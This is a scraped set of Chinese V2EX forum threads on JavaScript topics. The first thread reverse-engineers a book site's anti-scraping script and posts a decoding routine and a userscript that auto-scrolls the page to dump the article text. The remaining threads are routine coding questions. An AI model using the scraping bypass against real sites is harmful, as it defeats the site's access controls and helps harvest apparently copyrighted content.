{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.99csw.com/book/3906/134399.htm\">http://www.99csw.com/book/3906/134399.htm</a></p>\n\n<p>按 f12 打开网页，可以看到&lt;div id=\"content\"&gt;后面是文章内容，每个段落都是一个 div ，但是都是不可见的，而且是乱序的，不是网页上所看到的文章内容。</p>\n\n<p>然后继续往下，到了&lt;span id=\"note_box\" style=\"display: none;\"&gt;&lt;span class=\"note\"&gt;&lt;/span&gt;&lt;span class=\"arrow\"&gt;&lt;/span&gt;&lt;/span&gt; ，再下面的 div 开始，有一些是真正的文章内容，规律是第一个 div 是真实内容，然后每隔 5 个 div ，也就是第 7 个 div 又是真实内容，中间的 5 个 div 也是不可见的。</p>\n\n<p>然后我滚动网页往下，会加载新的 div(新的文章内容)，也是和上面的每隔 5 个 div 规律一样，同时&lt;span id=\"note_box\"之前的 div 在消失，也没有新的 ajax 请求产生。</p>\n\n<p>页面滚到最下方，最前面的 div 都消失了。</p>\n</div></div>"], "reply": "22", "tittle": "能不能帮分析下这个网页的 js 和 css 是怎么实现的", "comment": ["我都不知道怎么说，就这么实现的啊，可能他是为了 SEO ？\r", "你想用 js 怎么控制就怎么控制吧", "另外可能也是防止被爬？", "content = {\r", "    index: 0,\r", "    step: 5,\r", "    star: 0,\r", "    add: 0,\r", "    state: 'load',\r", "    showState: 'no',\r", "    childNode: [],\r", "    load: function () {\r", "        var e = base64.decode(document.getElementsByTagName('meta')[4].getAttribute('content')).split(/[A-Z]+%/);\r", "        var j = 0;\r", "\r", "        function r(a) {\r", "            var c = '';\r", "            var d = document.createElement('span');\r", "            for (var i = 0; i < 20; i++) {\r", "                var n = Math.floor(Math.random() * 99001 + 1000);\r", "                c += String.fromCharCode(n)\r", "            };\r", "            var b = ['。', '：', '？', '！', '—', '…', '；', '，', '”', ''];\r", "            c += b[Math.floor(Math.random() * b.length)];\r", "            d.style.color = '#fff';\r", "            d.style.fontSize = '0';\r", "            d.style.lineHeight = '0';\r", "            d.style.position = 'absolute';\r", "            d.style.top = 0;\r", "            d.style.left = 0;\r", "            d.appendChild(document.createTextNode(c));\r", "            a.appendChild(d);\r", "            return a\r", "        };\r", "        for (var i = 0; i < e.length; i++) {\r", "            if (e[i] < 5) {\r", "                this.childNode[e[i]] = r(this.box.childNodes[i + this.star]);\r", "                j++\r", "            } else {\r", "                this.childNode[e[i] - j] = r(this.box.childNodes[i + this.star])\r", "            }\r", "        };\r", "        this.show()\r", "    },\r", "    check: function () {\r", "        return this.showState == 'yes' && content.button.style.display != 'none' && this.offsetTop + this.button.offsetTop - Math.max(document.body.scrollTop, document.documentElement.scrollTop) < document.documentElement.clientHeight ? true : false\r", "    },\r", "    init: function (a, b) {\r", "        if (!b) {\r", "            return false\r", "        };\r", "        this.time = new Date().getTime();\r", "        this.box = a;\r", "        this.button = b;\r", "        this.offsetTop = 0;\r", "        this.randomContent = [];\r", "        this.hiddenItem = [];\r", "        this.showItem = [];\r", "\r", "        function random() {\r", "            return String.fromCharCode(Math.floor(Math.random() * 25 + 97)) + Math.floor(Math.random() * (1000000000))\r", "        };\r", "        var c = document.styleSheets[2];\r", "        for (var i = 0; i < 100; i++) {\r", "            this.showItem.push(random());\r", "            this.hiddenItem.push(random())\r", "        }\r", "        if (c.insertRule) {\r", "            c.insertRule('#content .' + this.hiddenItem.join(',#content .') + '{display:none;}', 0);\r", "            c.insertRule('#content .' + this.showItem.join(',#content .') + '{display:block;}', 0)\r", "        } else {\r", "            for (var i = 0; i < this.hiddenItem.length; i++) {\r", "                c.addRule('#content .' + this.hiddenItem[i], 'display:none');\r", "                c.addRule('#content .' + this.showItem[i], 'display:block')\r", "            }\r", "        };\r", "        for (var i = 0; i < this.box.childNodes.length; i++) {\r", "            if (this.box.childNodes[i].tagName == 'H2') {\r", "                this.star = i + 1\r", "            }\r", "            if (this.box.childNodes[i].tagName == 'DIV' && this.box.childNodes[i].className != 'chapter') {\r", "                break\r", "            }\r", "        };\r", "        /\\/([0-9]+)\\/([0-9]+)\\./.test(location.href);\r", "        this.sid = RegExp.$2;\r", "        this.load();\r", "        window.onscroll = function () {\r", "            if (content.check()) {\r", "                content.showNext()\r", "            }\r", "        }\r", "    },\r", "    show: function () {\r", "        this.showState = 'no';\r", "        var a = 0;\r", "        for (var i = this.index; i < this.childNode.length; i++) {\r", "            if (this.childNode[i].nodeType != 1) {\r", "                continue\r", "            };\r", "            a += this.childNode[i].innerHTML.length;\r", "            this.index = i + 1;\r", "            this.childNode[i].className = content.showItem[Math.floor(Math.random() * 100)];\r", "            this.box.appendChild(this.childNode[i]);\r", "            for (var j = 0; j < 5; j++) {\r", "                var b = this.childNode[Math.floor(Math.random() * this.childNode.length)].cloneNode(true);\r", "                b.className = content.hiddenItem[Math.floor(Math.random() * 100)];\r", "                this.box.appendChild(b)\r", "            };\r", "            if (a > 500) {\r", "                break\r", "            }\r", "        }\r", "        var c = getCookie(this.sid);\r", "        if (!c || c < this.index || c > this.childNode.length + 1) {\r", "            addCookie(this.sid, this.index, location.pathname)\r", "        }\r", "        content.time = getCookie(this.sid) > this.index ? 0 : new Date().getTime();\r", "        if (this.index >= this.childNode.length) {\r", "            this.button.style.display = 'none'\r", "        } else {\r", "            this.showState = 'yes';\r", "            if (this.check()) {\r", "                this.showNext()\r", "            }\r", "        }\r", "    },\r", "    showNext: function () {\r", "        if (this.showState == 'no') {\r", "            return false\r", "        };\r", "        this.showState = 'no';\r", "        setTimeout(function () {\r", "            content.show()\r", "        }, Math.max(0 - (new Date().getTime() - content.time), 0))\r", "    }\r", "};\r", "\r", "\r", "只能帮你到这里了", "对方做了防采集，你如果按照 html 中的顺序，文章段落四乱的。\r", "他这是加载后用 js 调整了顺序，你只需要按照他的 js 去还原就可以", "推荐一个网站， ", "\r", "楼主可以试试把那些看不懂的 js 文件内容复制到里面，会有神奇的结果等着你。", " 感谢了，我学习一下", " 我是想学学怎么采集，学习 js", "有点意思，我就深入进去了，最后找到了恢复段落顺序的办法，下面列出关键步骤：\r", "1. Chrome 查看源码，地址栏输入： view-source:http://www.99csw.com/book/3906/134399.htm\r", "2. 从网页源码中找到__第 5 个 meta 标签__，具体内容为：\r", "```html\r", "<meta name=\"client\" content=\"MTdFJTM3UyUzM0klNDJSJTI5TiU2SCUyN08lNDFBJTM5VSUxNUElMjJEJTMxVCUyNU8lNDBVJTEyTSUxNkwlNVUlNDNMJTdZJTBDJTI3WSUxNUglMjJTJTE0VCUyNUwlNDVHJTM3SiUyMFklMTlFJTMxVSU5USUzNkklMjFJJTExWSUzQSU0WiUzMUklNDFYJTI2ViUyVCUxUCUzOUUlMzdUJTE0UiUxNg==\" />\r", "```\r", "这个 meta 标签的 content 值是经过 base64.encode 处理过的段落顺序。\r", "3. 下载包含恢复顺序逻辑的 js 脚本文件（文件名为 99csw.js ）： ", "\r", "4. 将 99csw.js 的内容复制到 ", "\r", "5. 在 jsbeautifier 处理后的内容中找到 @", " 列出的 content 的内容，以及 content 前面的 base64 对象部分的内容。\r", "6. 只需看 content 对象的 load 函数的第一句话： var e = base64.decode(document.getElementsByTagName('meta')[4].getAttribute('content')).split(/[A-Z]+%/);\r", "这就是恢复段落顺序最关键的一步。\r", "7. 在 Chrome 浏览器中打开网页： ", "\r", "8. 按 F12 ，打开开发者工具，点击“控制台”或“ Console ”，输入： base64.decode(document.getElementsByTagName('meta')[4].getAttribute('content')).split(/[A-Z]+%/)\r", "你将会看到段落顺序数组。", " 感谢。\r", "我看不懂网站原有的 js ，所以之前 @", " 发的我没明白意思，看到 @", " 说的网站，我才知道原来可以这么看。再经过你的解释，就明白了。接下来我继续研究下怎么弄，谢谢。", "view-source:http://www.99csw.com/book/3906/134399.htm", " \r", "[\"17\", \"37\", \"33\", \"42\", \"29\", \"6\", \"27\", \"41\", \"39\", \"15\", \"22\", \"31\", \"25\", \"40\", \"12\", \"16\", \"5\", \"43\", \"7\", \"0\", \"27\", \"15\", \"22\", \"14\", \"25\", \"45\", \"37\", \"20\", \"19\", \"31\", \"9\", \"36\", \"21\", \"11\", \"3\", \"4\", \"31\", \"41\", \"26\", \"2\", \"1\", \"39\", \"37\", \"14\", \"16\"]\r", "\r", "这里面有些数字没有，而有些数字重复的，怎么弄呢", "数字缺失或重复，这个的看源码，你看看 content 这个对象的 load 方法的最后一个 for 循环：\r", "        for (var i = 0; i < e.length; i++) {\r", "            if (e[i] < 5) {\r", "                this.childNode[e[i]] = r(this.box.childNodes[i + this.star]);\r", "                j++\r", "            } else {\r", "                this.childNode[e[i] - j] = r(this.box.childNodes[i + this.star])\r", "            }\r", "        };\r", "简化一下就是（感觉上是某个 hash 算法的逆过程）：\r", "        for (var i = 0; i < e.length; i++) {\r", "            if (e[i] < 5) {\r", "                //序号不变，就是 e[i];\r", "                j++;//j 的初值为 0 ；\r", "            } else {\r", "                //序号为 e[i]-j\r", "            }\r", "        };\r", "\r", "所以最终的顺序可以这么求（以下代码均可在 console 里执行，当然得打开网址： ", " ）：\r", "\r", "var e = base64.decode(document.getElementsByTagName('meta')[4].getAttribute('content')).split(/[A-Z]+%/); \r", "\r", "var c=[], a=e.map(Number);\r", "\r", "for(i=0;i<a.length;i++){if(a[i]<5){c.push(a[i]);j++;}else{c.push(a[i]-j);}}\r", "\r", "最后结果是：\r", "[17, 37, 33, 42, 29, 6, 27, 41, 39, 15, 22, 31, 25, 40, 12, 16, 5, 43, 7, 0, 26, 14, 21, 13, 24, 44, 36, 19, 18, 30, 8, 35, 20, 10, 3, 4, 28, 38, 23, 2, 1, 34, 32, 9, 11]\r", "排一下续：\r", "c.sort(function(a,b){return a-b;})\r", "结果为：\r", "[0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44]", "那么多人提到我反解的 js,那么我在贡献一条新的思路,用油猴脚本:\r", "\r", "[code]\r", "// ==UserScript==\r", "// @", "         99csw\r", "// @", "    ", "\r", "// @", "      0.9\r", "// @", "  99csw get word\r", "// @", "       imt\r", "// @", "        ", "\r", "// @", "      ", "\r", "// @", "        none\r", "// ==/UserScript==\r", "/* jshint -W097 */\r", "'use strict';\r", "\r", "var times=30;\r", "function cus_scroll(){\r", "    if($(document).scrollTop()+document.documentElement.clientHeight>=$(document).height() && times>0){\r", "        $(\"#content div[class]:visible\").each(function(){ \r", "            $(this).children().remove();\r", "            console.log($(this).html());\r", "        });\r", "    }else{\r", "        $(\"body\").animate({ scrollTop:$(document).height() }, 1000,cus_scroll);\r", "    }\r", "}\r", "\r", "$(function(){ \r", "    $(\"body\").animate({ scrollTop:$(document).height() }, 1000,cus_scroll);\r", "});\r", "[/code]", " 非常感谢，每步都解释很清楚，对我帮助很大", " 好高深，我看不懂，但是我也非常感谢", " 就是油猴脚本,搜索一下,chrome 下直接输出原文内容哈", " 哇塞，试过了，自动滚动页面到最后，然后在 console 输出文章内容，超级强大了。我要好好花时间学习才行。感谢。", " 哈哈哈...好好学习,天天想上...", " 嗯嗯。我是想用火车采集，然后写个 php 插件来处理要抓取的内容，怎么调用 js ，还没搞明白。", " 这个是客户端采集,和服务端 php 插件不一样的.\r", "以你的问题为例:\r", "客户端采集,采集浏览器已经\"渲染\"排序的文章(最终文章的正确顺序),不用考虑它怎么\"算法\"排序的.\r", "而服务端彩信就是之前提到的那些\"算法\"找出对应的顺序,用你的 php 插件还原它的正确顺序.", " 嗯，火车采集器没法做渲染的动作呢", " 我已经用 php 还原正确顺序，搞定了，多谢。"]},
{"content": ["<div class=\"topic_content\">装了 gulp-babel 和 babel-preset-es2015 ；\r<br>\r<br>index.html 引入 es6.js\r<br>\r<br>es6.js 里写了 import xxx.js\r<br>\r<br>编译生成了个 require(xxx.js);\r<br>\r<br>然后该方法报错。\r<br>\r<br>我试着去引了 requirejs ，发现也不对。\r<br>请问正确得方式是什么？</div>"], "reply": "6", "tittle": "用 gulp 编译 ES6 的时候， import 编译出来的 require 到底是什么呢？", "comment": ["Webpack or browserify", "用一个支持 CommonJS 的 bundler", "babel-preset-es2015 不怕慢吗?我这里编译一个文件要 10s", " 确实慢，", "建议 webpack ， babel loader 上配置 query:{stage: 0}", "编译 es6 的不是 gulp ，是 babel 。\r", "babel 可以将 es6 的 import 编译成不同格式，如果是 CommonJs 显然是不能直接在浏览器跑的，需要一些 bundler （ webpack ， browserify ）帮你处理依赖打包成能在浏览器跑的代码。\r", "\r", " ， LZ 用的 babel 应该是 6.0 的， 6.0 已经不用 stage 了"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>技术最牛逼的公司全栈 js 。一般实习生薪水在 300/400 以上<br>\n次一点的公司用 python 或者 ruby 。一般实习生薪水在 200/300 以上<br>\n再次一点的用 php 。<br>\n末日公司用 java 。<br>\n奇怪的公司用 c 或者 c++。<br>\n奇葩公司用 其他语言。<br>\n老板 用 中文 /英文。。。</p>\n</div></div>"], "reply": "30", "tittle": "我对做 web 开发的时候涉及的语言做了一个排行。", "comment": ["js 如日中天", "黑 java 黑的漂亮", "用 C 怎么写 Web ... ", " 算吗", " 中天 是谁， js 写的东西也只是算玩具罢了", " 易中天啊，这个都不知道？", "有时间搞这些没意义的东西，还不如踏踏实实学技术", "又缺铜币啦？", "我们就是全栈 js 不过技术不牛逼", "不敢指名讨论有什么意义？谁知道你看到的世界是咋样的。", "坐等楼下人 SI BI 。", " 后端用什么？", "天天黑 java ，够了！", "这几天 java 在 v 站怎么了，都躺枪成尸了 23333_(:з」∠)_", "java/python 转 node , 表示回调要人命.", "Google 公司 java 用的少？", "唉，如果你只是发个贴让大家闹闹玩玩嘛，下面的话就当我也是说着玩。\r", "\r", "当你还在纠结语言，搞语言圣战的时候，真正 NB 的程序员都要财务自由了。说实话，这种程序员忘掉的语言可能都比你学过的多。\r", "\r", "好好学习，天天向上吧。", " 珍爱生命远离回调，骚年快皈依 Promise 吧", " node 啊", "你们够了，天天黑 java", "挖坑水平不行。", "技术是不分语言的，使用什么语言什么技术是要看应用场景的。希望楼主能提升一下自身水平再在 v2 上发表言论，少说些让人看了就知道自己是什么水平的话，可笑~", "阿里要末日了？", "一天到晚骗铜币差评", "嘿嘿嘿", " BAT 是商业模式已经成熟了，赚钱的闭环形成了，用什么语言已经不是技术选型会议能决定的了，根本不能拿出来比较啊。\r", "一众 startup 比较才有意义啊。", " 只会写玩具的人用什么语言写的都是玩具", " 蘑菇街要末日了。", "你置.NET 与何处？", " 单说新兴公司是个什么意义？因为小公司普遍不用 JAVA ？所以这个排行的选取范围是新兴公司为了排除 JAVA .NET 之流\r", "\r", "为什么后面给的实习工资？", "又黑 java"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>这是最近给公司写一个项目，遇到了很多手机端上传图片处理的坑，现在分享出来给大家讨论，交流。</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.jianshu.com/p/2a42a0c89640\">http://www.jianshu.com/p/2a42a0c89640</a></p>\n</div></div>"], "reply": "1", "tittle": "html5 上传本地图片处理各种问题", "comment": ["去看 ", " 只针对 PC 端，但有你需要的 HTML5 处理图片的问题"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><h1>先上示例动图</h1>\n\n<p><img src=\"http://i4.tietuku.com/b2be713964a22b8d.gif\" alt=\"示例动图\"></p>\n\n<h1>熟肉核心代码</h1>\n\n<p>scroll(function(direction) {<br>\n  if (direction == \"up\") {<br>\n    jQuery(\".scrollcircle\").addClass(\"scroll_up\");<br>\n  } else {<br>\n    jQuery(\".scrollcircle\").addClass(\"scroll_down\");<br>\n  }<br>\n});<br>\nvar cssend = document.querySelector(\".scrollcircle\");<br>\ncssend.addEventListener(\"webkitAnimationEnd\", function() {<br>\n  jQuery(\".scrollcircle\").removeClass(\"scroll_up\").removeClass(\"scroll_down\");<br>\n}, false);<br>\nfunction scroll(fn) {<br>\n  var beforeScrollTop = document.body.scrollTop, fn = fn || function() {<br>\n  };<br>\n  window.addEventListener(\"scroll\", function() {<br>\n    var afterScrollTop = document.body.scrollTop, delta = afterScrollTop - beforeScrollTop;<br>\n    if (delta === 0) {<br>\n      return false;<br>\n    }<br>\n    fn(delta &gt; 0 ? \"down\" : \"up\");<br>\n    beforeScrollTop = afterScrollTop;<br>\n  }, false);<br>\n};</p>\n\n<h1>全部代码详见</h1>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://www.dyniao.com/use-javascript-and-css3-add-scroll-effect/\">http://www.dyniao.com/use-javascript-and-css3-add-scroll-effect/</a></p>\n</div></div>", "<div class=\"topic_content\"><div class=\"markdown_body\"><p>目前这样的配置确实没有什么意义，主要就是看着玩的。</p>\n\n<p>但是可以将这个做成有意义的。<br>\n比如弄个右下角的菜单，鼠标指向展开什么的，藏几个链接在里边。</p>\n\n<p>多加了一个判断，这样两个浏览器都能获取到滚动条的位置了。</p>\n\n<p>document.documentElement.scrollTop || document.body.scrollTop</p>\n\n<p>改成非 jq 版的 js 代码，便于操作，将 class 改成 id 了，或者用 html5 的 document.querySelector 。<br>\nfunction g(e){return document.getElementById(e);}<br>\n//function g(e){return document.querySelector(e);}<br>\n//用法 g(\".css\") 用着跟 jquery 选择器一样。<br>\nscroll(function(direction) {<br>\n  if(direction=='up')<br>\n  {<br>\n    g(\"scrollcircle\").className+='scroll_up ';}<br>\nelse {<br>\n    g(\"scrollcircle\").className+='scroll_down ';<br><br>\n  }<br>\n});<br>\nvar anim = g(\"scrollcircle\");<br>\nanim.addEventListener('animationend', function(){anim.className=\"\";}, false);<br>\nfunction scroll(fn) {<br>\nvar beforeScrollTop = document.documentElement.scrollTop || document.body.scrollTop,fn = fn ||  function() {};<br>\n    window.addEventListener(\"scroll\", function() {var afterScrollTop = document.documentElement.scrollTop || document.body.scrollTop, delta = afterScrollTop - beforeScrollTop;if( delta === 0 ) return false;fn( delta &gt; 0 ? \"down\" : \"up\" );beforeScrollTop = afterScrollTop;<br>\n    }, false);<br>\n}</p>\n</div></div>"], "reply": "13", "tittle": "分享一个新鲜代码，用 Javascript 和 CSS3 来增加页面滚动的效果", "comment": ["老实说，看着有点累，用户浏览网页通常是为了浏览内容，被特效干扰体验不友好", "mark", "求无 JQuery 版本", "成品代码为啥不给一个页面让用户体验一下……\r", "说实话看动图我完全没看懂这是个啥。", " 好吧，没注意楼主网站上就有一个。因为我用的 Firefox 所以这玩意儿并不会动，而且屏幕稍微大一旦就根本留意不到……", "代码不错，完全可以改成没有 jq 的~", "如果能让左下原盘可以手动滚动，使得滚动条滚动就是一个不错的轮子了。", "这存在的意义是什么？", "跳帧现象。。。", "手机上巨卡", " 应该是硬件渲染 css3 慢导致的吧。具体原因不是很明白。", " \r", " \r", "已经无 jq 了", " github 地址呢？大小有多大啊？需要我我给你提供 cdn 地址不~"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>今天在 React 中看到了这样一段代码，觉得很奇怪</p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"http://ww4.sinaimg.cn/large/442b51e6gw1ez5awy9oyxj20hz09xju7.jpg\">http://ww4.sinaimg.cn/large/442b51e6gw1ez5awy9oyxj20hz09xju7.jpg</a></p>\n\n<p><a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/facebook/react/blob/401e6f10587b09d4e725763984957cf309dfdc30/src/renderers/dom/client/eventPlugins/DefaultEventPluginOrder.js#L25\">https://github.com/facebook/react/blob/401e6f10587b09d4e725763984957cf309dfdc30/src/renderers/dom/client/eventPlugins/DefaultEventPluginOrder.js#L25</a></p>\n\n<p>DefaultEventPluginOrder 是一个 string[] 这里 keyOf 所做的事情就是返回这个 one key object 的 key. <br>\n这些 key 并没有被 expose 出来, 这样做的意义是为了不写 magic string 而不写 magic string?</p>\n</div></div>"], "reply": "9", "tittle": "React 中的一段代码很奇怪", "comment": ["同样的还有这里\r", "源代码已经其实已经说的比较清楚了\r", "\r", "\r", "\r", "这个函数的目的其实在给字符串变量以类型，这样可以追踪这些字串被引用的地方。这种手法常在一些函数式语言中使用，如 haskell, ocaml.\r", "\r", "react 在这里使用这一技巧的目的是想方便的做 minification \r", " 但这么做没有意义，这里的 SimpleEventPlugin 并不是常量。在两个不同文件中出现 {SimpleEventPlugin: ''} 不意味着这两个 SimpleEventPlugin 就能被安全替换。\r", "\r", "事实上在 minified 后的代码中这些代码也全部保留了\r", " ", " 这个只能说 minify 的效果没有达到 react 使用这一手法的初衷。\r", "\r", "这一技巧用弱类型语言中有不少限制，常见函数式语言静态分析就可以搞定，换作 js 的话，就需要动态分析才能 minify 这个 SimpleEventPlugin 这个\"类型\"了.", "关注一下", " 感谢已发送。我觉得如果 expose const string 出来的话 minify 是可以实现的, 从 minified 的代码看来本地变量是可以被优化的。\r", "\r", "比如这样\r", "```javascript\r", "var {\r", "    SimpleEventPlugin,\r", "    TapEventPlugin,\r", "    EnterLeaveEventPlugin,\r", "    ChangeEventPlugin\r", "} = require('const-definition');\r", "\r", "var DefaultEventPluginOrder = [\r", "  SimpleEventPlugin,\r", "  TapEventPlugin,\r", "  EnterLeaveEventPlugin,\r", "  ChangeEventPlugin\r", "];\r", "\r", "```", "keyOf 可以在 closure compiler 的 advanced mode 下实现重命名\r", "\r", "\r", "\r", " 恩，看了一下 Google Closure Compiler 使用  Advanced 模式的话，也可以生效。\r", "\r", "\r", "\r", "```\r", "var keyOf = function(oneKeyObj) {\r", "  var key;\r", "  for (key in oneKeyObj) {\r", "    if (!oneKeyObj.hasOwnProperty(key)) {\r", "      continue;\r", "    }\r", "    return key;\r", "  }\r", "  return null;\r", "};\r", "\r", "var DefaultEventPluginOrder = [\r", "  keyOf({ResponderEventPlugin: null}),\r", "  keyOf({SimpleEventPlugin: null}),\r", "  keyOf({TapEventPlugin: null}),\r", "  keyOf({EnterLeaveEventPlugin: null}),\r", "  keyOf({ChangeEventPlugin: null}),\r", "  keyOf({SelectEventPlugin: null}),\r", "  keyOf({BeforeInputEventPlugin: null}),\r", "];\r", "\r", "\r", "var DefaultEventPluginOrder2 = [\r", "  keyOf({ResponderEventPlugin: null}),\r", "  keyOf({SimpleEventPlugin: null}),\r", "  keyOf({TapEventPlugin: null}),\r", "  keyOf({EnterLeaveEventPlugin: null}),\r", "  keyOf({ChangeEventPlugin: null}),\r", "  keyOf({SelectEventPlugin: null}),\r", "  keyOf({BeforeInputEventPlugin: null}),\r", "];\r", "\r", "module.exports = DefaultEventPluginOrder;\r", "module.exports = DefaultEventPluginOrder2;\r", "```", "晕，和楼上重了。。。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>对于普通格式的视频，可以用 video 标签的 playbackrate 属性实现 2X 两倍速度播放，<br>\nflash 用的是 object 标签，如何设置播放速度呢？<br>\n比如这个视频：<a target=\"_blank\" rel=\"nofollow\" href=\"http://study.163.com/course/courseLearn.htm?courseId=288006#/learn/video?lessonId=399106&amp;courseId=288006\">link</a></p>\n</div></div>"], "reply": "3", "tittle": "[HELP]如何使用 JS 改变网页 flash 视频的播放速度", "comment": ["我还没看链接，但我猜是大学选修课", " 哈哈 猜错了 大学选修课可以直接挂后台", " @", " 我觉得视频教程网站有一个‘ 2X ’选项很人性化啊，速度快一点播放，完全不影响播放效果且节约 50%的时间。一般的 html<video>视频我都是在 console 里面直接改 playbackrate, 但是有的网站是 flash 格式的，所以不懂求教"]},
{"content": "", "reply": "7", "tittle": "js 里 function xxx() {}和 var xxx=function() {}有何区别？", "comment": ["第一个是函数声明、第二个是函数表达式\r", "二者区别在于\r", "前者可以后置，可以通过函数名访问，不可以匿名，不可以立即调用\r", "后者相反，不可以后置，不可以通过函数名访问，可以匿名，可以立即调用", " \r", " 受教了，十分感谢！", "最近正在学 js ，感觉坑还挺多，有些概念和传统的 oo 语言有些区别 看起来有点吃力 @ @", "前者可以被 hoist\r", "\r", "再考你一下, 下面的 console 输出什么？\r", "\r", " ```\r", "var x = 1;\r", "\r", "(function () {\r", "  console.log(x);\r", "  var x = 2;\r", "}());\r", "```", " 作用域坑死一堆新人😁😁😁", "函数式神教的教徒表示只用第二种 /w\\"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>Repost:<a target=\"_blank\" rel=\"nofollow\" href=\"https://www.v2ex.com/t/244792\">原问题</a></p>\n\n<p>对于普通格式的视频，可以用 video 标签的 playbackrate 属性实现 2X 两倍速度播放，<br>\nflash 用的是 object 标签，如何设置播放速度呢？<br>\n比如这个视频： <a target=\"_blank\" rel=\"nofollow\" href=\"http://study.163.com/course/courseLearn.htm?courseId=288006#/learn/video?lessonId=399106&amp;courseId=288006\">link</a></p>\n</div></div>"], "reply": "10", "tittle": "[HELP-Repost]如何使用 JS 改变网页 flash 视频的播放速度", "comment": ["停用糟糕的 Flash 吧；这应该是做播放器的人考虑的；一般都会提供好方法。", "好像...似乎...也许...做不到", "不可能， Flash 不是瀏覽器控件，每個播放器的功能和 API 都各有千秋。", " 原生瀏覽器控件才對，一時手滑打漏了。", " @", " @", " 比如网易云课堂，网站部分视频是 object 标签用 flash 播放 swf 视频，但是，同样的视频，他的 IOS 客户端是可以‘ 2X ’速度播放的，是如何实现？", " 两者不是同一个层面上的东西， iOS 客户端调用的是 iOS 自带播放器，只需要一行代码就可以控制他的播放速率，而 Flash 方面则要看你选用的播放器有没有提供相关接口，没有的话根本没辙。而且我觉得你是误解了某些东西了，能不能调速率与视频源文件是没有任何关系的，执行解码的也不是 JS ，而是 Flash / HTML 的 Video 元素。", " 总结来说就是 JS 并没有控制视频速率的能力， JS 本身只能调用控件的 API 进行速率调整， Video 是 playbackrate ， Flash 得看你那个播放器的 API 。", " 上面说的是对的，这个应该是封装好直接给你用的，不是你用 JS 需要考虑的。", " 以[这个]( ", " onratechange()函数却没有 setRate 相关的属性或函数", " 以[这个]( ", ") 为例，<object>有 onratechange()函数却没有 setRate 相关的属性或函数"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>没完整写过 javascript 的脚本, 今天看阮一峰的 es6 教程, 发现这么一句话: </p>\n\n<blockquote>\n<p>\"<strong>es7.exponentiationOperator</strong>：指数运算符\"</p>\n</blockquote>\n\n<p>之前 javascript 我是通过<strong>math.pow()</strong>来实现指数运算的, 为什么大部分语言都集成了指数运算符, 而 javascript 现在才提出, 是因为实际生产中基本用不着, 还是什么历史原因来的.</p>\n</div></div>"], "reply": "21", "tittle": "为什么 es7 才提出\"指数运算符\", 难道之前 javascript 基本不需要指数运算么?", "comment": ["C 语言也没有指数运算符啊", "忘了加限制条件, \"脚本语言....\"\r", "\r", "囧", "大部分语言都集成了指数运算符 请举例\r", "另外指数可以用对数换底来算", " 但是 PC 用的 CRT 里一般都有软硬浮点库和 math.h", " \r", "我就会这几个\r", "python\r", "2**3\r", "---\r", "irb\r", "2**3\r", "---\r", "R\r", "2^3\r", "---\r", "perl\r", "2**3\r", "\r", "我就会这几个.... 其他的确实不清楚", "为什么我觉得你应该没怎么写过代码呢？ ╮(╯_╰)╭……", " 嗯 是哩\r", "呵呵", "因为开始的时候设计  javascript 只不过是为了给页面加点效果罢了", " 看了一下你的 github 确实十分 diao.....\r", "相比我应该就是 hello world 的水平....", " 然而依然没有运算符。", " \r", "不关这个事……中缀运算符在很多语言里面不过就是一个语法糖而已，加上并不难，甚至还有语言可以跟定义函数一样随意定义中缀运算符\r", "\r", "举个 Haskell 的例子\r", "a .!@#$%^&* b = a + b\r", "print (1 .!@#$%^&* 2)\r", "\r", "输出 3", " 但是谁都没想到， JavaScript 现在变成了一门那么流行的编程语言……", "我猜因为优先级的原因，所以没有加入。\r", "3 ^ 3 ^ 3 = ? (3 ^ 3) ^ 3 or 3 ^ (3 ^ 3)", " \r", "\r", "……这个超简单啊，左结合啊。 3 ^ 3 ^ 3 -> (3 ^ 3) ^ 3", "  ", "\r", "百度和 google 都是这结果", "  那就默认右结合嘛……\r", "\r", "不过 js 好像没有右结合运算符……还是我大 Haskell 好", " 我讲一个冷门但是大家电脑上基本都有的： bash: echo $((2**32-1))\r", "\r", "* * *\r", "-其实是 ES7 什么都在问 Python 学吧？-", "JS 本来也不是拿来充当全功能脚本语言用的。\r", "和 Py/Rb/Pl 的设计方向本来就不同。\r", "现在逐步进化的过程中才慢慢加入一些新的通用编程特性。", "大概是因为^被占用了吧...", " 因为数学库本来就不是基本功能。", "应该是继承 C 系，指数运算本来就不是硬件指令而是软件实现的"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>分享一下最近硬译了的<a target=\"_blank\" rel=\"nofollow\" href=\"https://lodash.com/\">lodash</a>.<br>\n翻译的不好╮(╯﹏╰）╭ 英文能力太差了...<br>\n欢迎 PR.</p>\n\n<p>在线预览: <a target=\"_blank\" rel=\"nofollow\" href=\"http://lodash.qiuqudou.com\">lodash 中文</a><br>\ngithub:  <a target=\"_blank\" rel=\"nofollow\" href=\"https://github.com/DearMadMan/lodash-zh\">lodash-zh</a></p>\n</div></div>"], "reply": "9", "tittle": "分享一下硬译的 lodash", "comment": ["字符集声明错了", "赞...star 已送", "给力，已 star", "感谢提醒,使用的 express 源文件忘记添加字符集了，修正了", "感谢, 无以言表啊", "搭车推荐前几天翻译的一篇文章：如何百倍加速 Lo-Dash ？引入惰性计算 ", "字符集这个 chrome 选择自动检测本来就是好的", "Orz 原来就在这"]},
